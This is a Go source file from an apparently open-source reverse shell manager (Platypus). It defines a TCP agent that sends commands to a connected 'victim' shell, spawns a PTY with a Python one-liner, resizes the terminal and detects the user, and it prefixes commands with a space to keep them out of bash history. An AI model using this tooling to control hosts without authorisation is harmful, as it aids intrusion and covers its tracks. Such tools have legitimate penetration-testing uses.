package agent

import (
	"bytes"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/internal/databases"
	"github.com/WangYihang/Platypus/internal/utils/log"
	"github.com/WangYihang/Platypus/internal/utils/str"
)

type PlainTCPAgent struct {
	AgentConn
}

func (a *PlainTCPAgent) Setup() {
	// a.Username = "root"
	// a.IP = "1.1.1.1"
}

func (a *PlainTCPAgent) GetID() string {
	return a.ID
}

func (a *PlainTCPAgent) RawSystem(command string) {
	// https://www.technovelty.org/linux/skipping-bash-history-for-command-lines-starting-with-space.html
	// Make bash not store command history
	a.Conn.Write([]byte(" " + command + "\n"))
}

func (a *PlainTCPAgent) ReadConnLock(b []byte) (int, error) {
	// c.readLock.Lock()
	n, err := a.Conn.Read(b)
	// c.readLock.Unlock()
	return n, err
}

func (a *PlainTCPAgent) ReadUntil(token string) (string, bool) {
	inputBuffer := make([]byte, 1)
	var outputBuffer bytes.Buffer
	var isTimeout bool
	for {
		// a.Conn.SetReadDeadline(time.Now().Add(time.Second * 1))
		n, err := a.ReadConnLock(inputBuffer)
		// fmt.Printf("%d bytes read, now %v\n", n, outputBuffer.String())
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Error("Read response timeout from client")
				isTimeout = true
			} else {
				log.Error("Read from client failed")
			}
			break
		}
		outputBuffer.Write(inputBuffer[:n])
		// If found token, then finish reading
		// fmt.Printf("%v vs %v", outputBuffer.String(), token)

		if strings.HasSuffix(strings.TrimSpace(outputBuffer.String()), token) {
			break
		}
	}
	a.Conn.SetReadDeadline(time.Time{})
	log.Info("%d bytes read from client, %v", len(outputBuffer.String()), outputBuffer.String())
	return outputBuffer.String(), isTimeout
}

func (a *PlainTCPAgent) WriteLine(line string) {
	a.Conn.Write([]byte(line + "\n"))
}

func (a *PlainTCPAgent) System(command string) string {
	// return fmt.Sprintf("PlainTCPAgent<System>: %s", command)

	tokenA := str.RandomString(0x08)
	tokenB := str.RandomString(0x08)

	var input string

	// Construct command to execute
	// ; echo tokenB and & echo tokenB are for commands which will be execute unsuccessfully
	if a.OS == "windows" {
		// For Windows client
		input = "echo " + tokenA + " && " + command + " & echo " + tokenB
	} else {
		// For Linux client
		input = "echo " + tokenA + " && " + command + " ; echo " + tokenB
	}

	fmt.Println(input)

	// a.RawSystem(input)
	a.WriteLine(input)

	// if c.echoEnabled {
	// 	// TODO: test restful api, execute system
	// 	// Read Pty Echo as junk
	a.ReadUntil(tokenB)

	// }

	var isTimeout bool
	if a.OS == "windows" {
		// For Windows client
		_, isTimeout = a.ReadUntil(tokenA)
	} else {
		// For Linux client
		_, isTimeout = a.ReadUntil(tokenA)
	}

	// If read response timeout from client, returns directly
	if isTimeout {
		return ""
	}

	fmt.Println("Token A read>>>>>>>>>>>>")

	output, _ := a.ReadUntil(tokenB)

	fmt.Println("Token B read>>>>>>>>>>>>")

	result := strings.Split(output, tokenB)[0]
	return result
}

func (a *PlainTCPAgent) Download(remotePath string, localPath string) {

}

func (a *PlainTCPAgent) Upload(localPath string, remotePath string) {

}

func (a *PlainTCPAgent) GetConn() net.Conn {
	return a.Conn
}

func (a *PlainTCPAgent) Handle() {
	// a.Conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 26\r\n\r\nthis is plain tcp listener"))
	a.GatherClientInfo("")
	a.SpawnTTY()
	// a.Conn.Close()
}

func (a *PlainTCPAgent) SpawnTTY() {
	// Step 1: Spawn /bin/sh via pty of victim
	command := "/usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
	log.Error("spawning /bin/bash on the current client")
	a.WriteLine(command)
}

func (a *PlainTCPAgent) ResetWindow(width int, height int) {
	// Step 3: Reset victim window size to fit attacker window size
	log.Info("reseting client terminal...")
	a.WriteLine("reset")
	log.Info("reseting client SHELL...")
	a.WriteLine("export SHELL=bash")
	log.Info("reseting client TERM colors...")
	a.WriteLine("export TERM=xterm-256color")
	log.Info("reseting client window size...")
	a.WriteLine(fmt.Sprintf("stty rows %d columns %d", height, width))
}

func (a *PlainTCPAgent) GatherClientInfo(hashFormat string) {
	log.Info("Gathering information from client...")
	// echoEnabled, _ := c.tryReadEcho(str.RandomString(0x10))
	// c.echoEnabled = echoEnabled
	// a.detectOS()
	a.detectUser()
	log.Info("%v", a.Username)

	// a.detectOS()
	// log.Info("%v", a.OS)

	// c.detectPython()
	// c.detectNetworkInterfaces()
	// c.Hash = c.makeHash(hashFormat)
	// c.mature = true
}

func (a *PlainTCPAgent) detectUser() {
	switch a.OS {
	case "linux":
		a.Username = strings.TrimSpace(a.System("whoami"))
		log.Info("[%s] User detected: %s", a.Conn.RemoteAddr().String(), a.Username)
	case "windows":
		a.Username = strings.TrimSpace(a.System("whoami"))
		log.Info("[%s] User detected: %s", a.Conn.RemoteAddr().String(), a.Username)
	default:
		log.Error("[%s] Unrecognized operating system", a.Conn.RemoteAddr().String())
	}
	databases.DB.Model(&Agent{}).Where("ID = ?", a.GetID()).Update("username", a.Username)
}

func (a *PlainTCPAgent) detectOS() {
	tokenA := str.RandomString(0x08)
	tokenB := str.RandomString(0x08)
	// For Unix-Like OSs
	command := fmt.Sprintf("echo %s; uname ; echo %s", tokenA, tokenB)
	a.System(command)

	// if c.echoEnabled {
	// 	// Read echo
	// 	a.ReadUntil(tokenB)
	// 	a.ReadUntil(tokenA)
	// }
	output, _ := a.ReadUntil(tokenB)

	a.OS = strings.ToLower(output)
	// kwos := map[string]oss.OperatingSystem{
	// 	"linux":   "linux",
	// 	"sunos":   "sunos",
	// 	"freebsd": "freebsd",
	// 	"darwin":  "darwin",
	// }
	// for keyword, os := range kwos {
	// 	if strings.Contains(strings.ToLower(output), keyword) {
	// 		a.OS = os
	// 		log.Debug("[%s] OS detected: %s", c.conn.RemoteAddr().String(), c.OS.String())
	// 		if c.server.DisableHistory {
	// 			a.disableHistory()
	// 		}
	// 		return
	// 	}
	// }
	databases.DB.Model(&a).Update("os", a.OS)
}

// 	// For Windows(or unknown)
// 	a.System(fmt.Sprintf("echo %s && ver && echo %s", tokenA, tokenB))

// 	if c.echoEnabled {
// 		// Read echo
// 		a.ReadUntil(tokenB)
// 		a.ReadUntil(tokenA)
// 	}
// 	output, _ = c.ReadUntil(tokenB)
// 	log.Info(output)
// 	if strings.Contains(strings.ToLower(output), "windows") {
// 		// CMD
// 		a.OS = oss.Windows
// 		log.Debug("[%s] OS detected: %s", c.conn.RemoteAddr().String(), c.OS.String())
// 		return
// 	}

// 	if output == "\r\n"+tokenA+"\r\n"+tokenB {
// 		// Powershell
// 		a.OS = oss.WindowsPowerShell
// 		log.Debug("[%s] OS detected: %s with PowerShell", c.conn.RemoteAddr().String(), c.OS.String())
// 		return
// 	}

// 	// Unknown OS
// 	log.Error("[%s] OS detection failed, set OS = `Unknown`", c.conn.RemoteAddr().String())
// 	a.OS = oss.Unknown
// }

// func (a *TCPClient) detectPython() {
// 	var result string
// 	var version string
// 	if c.OS == oss.Windows {
// 		// On windows platform, there is a fake python interpreter:
// 		// %HOME%\AppData\Local\Microsoft\WindowsApps\python.exe
// 		// The windows app store will be opened if the user didn't install python from the store
// 		// This situation will be fuzzy to us.
// 		result = strings.TrimSpace(c.SystemToken("where python"))
// 		if strings.HasSuffix(result, "python.exe") {
// 			version = strings.TrimSpace(c.SystemToken("python --version"))
// 			if strings.HasPrefix(version, "Python 3") {
// 				a.Python3 = strings.TrimSpace(strings.Split(result, "\n")[0])
// 				log.Debug("[%s] Python3 found: %s", c.conn.RemoteAddr().String(), c.Python3)
// 				result = strings.TrimSpace(c.SystemToken("where python2"))
// 				if strings.HasSuffix(result, "python2.exe") {
// 					a.Python2 = strings.TrimSpace(strings.Split(result, "\n")[0])
// 					log.Debug("[%s] Python2 found: %s", c.conn.RemoteAddr().String(), result)
// 				}
// 			} else if strings.HasPrefix(version, "Python 2") {
// 				a.Python2 = strings.TrimSpace(strings.Split(result, "\n")[0])
// 				log.Debug("[%s] Python2 found: %s", c.conn.RemoteAddr().String(), c.Python2)
// 				result = strings.TrimSpace(c.SystemToken("where python3"))
// 				if strings.HasSuffix(result, "python3.exe") {
// 					a.Python3 = strings.TrimSpace(strings.Split(result, "\n")[0])
// 					log.Debug("[%s] Python3 found: %s", c.conn.RemoteAddr().String(), result)
// 				}
// 			} else {
// 				log.Error("[%s] Unrecognized python version: %s", c.conn.RemoteAddr().String(), version)
// 			}
// 		} else {
// 			log.Error("[%s] No python on traget machine.", c.conn.RemoteAddr().String())
// 		}
// 	} else if c.OS == oss.Linux {
// 		result = strings.TrimSpace(c.SystemToken("which python2"))
// 		if result != "" {
// 			a.Python2 = strings.TrimSpace(strings.Split(result, "\n")[0])
// 			log.Debug("[%s] Python2 found: %s", c.conn.RemoteAddr().String(), result)
// 		}
// 		result = strings.TrimSpace(c.SystemToken("which python3"))
// 		if result != "" {
// 			a.Python3 = strings.TrimSpace(strings.Split(result, "\n")[0])
// 			log.Debug("[%s] Python3 found: %s", c.conn.RemoteAddr().String(), result)
// 		}
// 	} else {
// 		log.Error("[%s] Unsupported OS: %s", c.conn.RemoteAddr().String(), c.OS.String())
// 	}
// }

// func (a *PlainTCPAgent) detectNetworkInterfaces() {
// 	if c.OS == oss.Linux {
// 		ifnames := strings.Split(strings.TrimSpace(c.SystemToken("ls /sys/class/net")), "\n")
// 		for _, ifname := range ifnames {
// 			mac, err := c.ReadFile(fmt.Sprintf("/sys/class/net/%s/address", ifname))
// 			if err != nil {
// 				log.Error("[%s] Detect network interfaces failed: %s", c.conn.RemoteAddr().String(), err)
// 				return
// 			}
// 			a.NetworkInterfaces[ifname] = strings.TrimSpace(mac)
// 			log.Debug("[%s] Network Interface (%s): %s", c.conn.RemoteAddr().String(), ifname, mac)
// 		}
// 	}
// }

// // func (a *PlainTCPAgent) tryReadEcho(echo string) (bool, string) {
// // 	// Check whether the client enable terminal echo
// // 	inputBuffer := make([]byte, 1)
// // 	var outputBuffer bytes.Buffer
// // 	var echoEnabled bool = true

// // 	// Clean all prompt
// // 	// eg: `root@root:/root# `
// // 	a.Read(time.Second * 1)

// // 	// Ping
// // 	a.Write([]byte(echo + "\n"))

// // 	// Read pong and check the echo
// // 	for _, ch := range echo {
// // 		// Set read time out
// // 		a.conn.SetReadDeadline(time.Now().Add(time.Second * 1))
// // 		n, err := c.ReadConnLock(inputBuffer)
// // 		if err == nil {
// // 			outputBuffer.Write(inputBuffer[:n])
// // 			if byte(ch) != inputBuffer[0] {
// // 				echoEnabled = false
// // 				break
// // 			}
// // 		} else {
// // 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
// // 				echoEnabled = false
// // 			} else {
// // 				log.Error("Read from client failed")
// // 				a.interactive = false
// // 				Ctx.Current = nil
// // 				Ctx.DeleteTCPClient(c)
// // 			}
// // 			break
// // 		}
// // 	}

// // 	// Return echoEnabled and misread data (when echoEnabled is false)
// // 	return echoEnabled, outputBuffer.String()
// // }
